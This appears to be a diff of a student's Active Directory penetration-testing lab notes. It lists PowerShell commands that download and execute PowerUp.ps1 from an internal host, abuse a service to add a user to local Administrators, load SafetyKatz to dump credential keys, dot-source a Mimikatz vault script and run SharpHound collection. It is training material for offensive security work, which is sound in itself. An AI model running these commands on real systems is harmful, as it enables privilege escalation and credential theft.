@@ -6,22 +6,26 @@ iex(iwr 'http://172.16.100.48/PowerUp.ps1' -useb)
 Invoke-AllChecks
 Get-ServiceUnquoted -Verbose
 Get-ModifiableServiceFile -Verbose
+
 Get-ModifiableService -Verbose
 
 help  Invoke-ServiceAbuse
 
-Invoke-ServiceAbuse -Name AbyssWebServer -UserName "dcorp\student548" -Verbose
+Invoke-ServiceAbuse -Name SNMPTRAP -UserName "dcorp\student548" -Verbose
+
 net1 localgroup Administrators
 ```
 
 ```powershell
-Import-Module .\PrivEscCheck.ps1
-
-Invoke-PrivEscCheck
+C:\Users\Public\Loader.exe -path C:\Users\Public\SafetyKatz.exe -args sekurlsa::evasive-keys exit
 ```
 
 ```powershell
-.\Loader.exe -Path C:\AD\Tools\winPEASx64.exe -args notcolor log
+. C:\Users\Public\Invoke-MimiEx-vault.ps1
 ```
 
+> In a privileged shell
 
+ ```powershell
+.\Loader.exe -Path .\SharpHound.exe -args --collectionmethods Group,GPOLocalGroup,Session,Trusts,ACL,Container,ObjectProps,SPNTargets,CertServices --excludedcs --zipfilename shout
+```
